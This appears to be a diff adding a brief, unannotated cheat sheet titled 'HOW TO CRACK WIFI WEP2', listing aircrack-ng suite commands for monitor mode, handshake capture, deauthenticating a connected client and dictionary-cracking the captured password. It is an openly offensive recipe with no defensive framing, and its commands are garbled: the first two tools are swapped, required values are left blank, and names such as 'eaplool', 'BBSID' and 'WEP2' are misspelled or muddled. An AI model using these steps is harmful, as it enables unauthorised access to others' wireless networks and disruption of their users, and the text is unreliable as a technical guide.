@@ -1,0 +1,15 @@
+HOW TO CRACK WIFI WEP2 
+
+1 start interface = airodump-ng wlan0
+
+2 capture BSSID end CAHNNEL = airmon-ng wlan0mon
+
+3 capture eaplool = airodump-ng --bssid --channel --write prova.cap wlan0
+
+3 capture eaplool = airodump-ng --bssid --channel --write prova.cap wlan0mon
+
+4 capture password = aireplay-ng --deauth 4 -a BBSID -c STATION wlan0
+
+4 capture password = aireplay-ng --deauth 4 -a BBSID -c STATION wlan0mon
+
+5 crack wifi = aircrack-ng -w /password=lsit.txt -b BSSID prova.cap
